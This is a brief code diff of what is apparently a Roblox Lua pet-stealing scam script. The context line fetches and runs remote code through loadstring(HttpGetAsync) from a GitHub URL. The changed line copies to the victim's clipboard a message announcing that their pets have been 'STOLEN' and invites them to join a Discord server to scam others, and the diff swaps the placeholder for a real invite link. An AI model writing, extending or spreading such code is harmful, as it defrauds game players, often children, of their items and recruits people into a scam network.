@@ -34,7 +34,7 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
+        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
